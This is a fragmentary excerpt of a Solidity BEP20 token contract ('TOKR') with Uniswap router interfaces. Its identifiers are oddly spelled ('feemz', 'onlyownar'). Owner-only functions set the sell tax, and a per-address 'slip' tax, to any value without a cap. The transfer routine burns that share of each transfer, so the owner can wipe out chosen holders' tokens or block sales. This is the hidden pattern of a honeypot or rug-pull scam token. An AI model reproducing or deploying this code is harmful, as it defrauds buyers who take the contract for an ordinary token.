...
interface IUniswapV2Factory {
    ...
    function feemzTo() external view returns (address);
    function feemzToSetter() external view returns (address);
    ...
    function setfeemzTo(address) external;
    function setfeemzToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeemzOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeemzOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeemzOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeemzOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeemzOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract TOKR is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeemz = 0;

    uint256 private _defaultBuyfeemz = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeemz;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeemz = _value;
    }

    function setSlipfeemz(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeemz[_address] = _value;
    }

    function getSlipfeemz(address _address) external view onlyownar returns (uint256) {
        return _slipfeemz[_address];
    }


    function setMAccountfeemz(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeemz(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeemzAmount = 0;

        if (rF) {
            uint256 tradefeemz = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeemz = _defaultSellfeemz;
                }
                if (from == uniswapV2Pair) {

                    tradefeemz = _defaultBuyfeemz;
                }
            }
            if (_slipfeemz[from] > 0) {
                tradefeemz = _slipfeemz[from];
            }

            tradefeemzAmount = _Amount.mul(tradefeemz).div(100);
        }


        if (tradefeemzAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeemzAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeemzAmount);
            emit Transfer(from, _deadAddress, tradefeemzAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeemzAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeemzAmount);
        emit Transfer(from, _to, _Amount - tradefeemzAmount);
    }
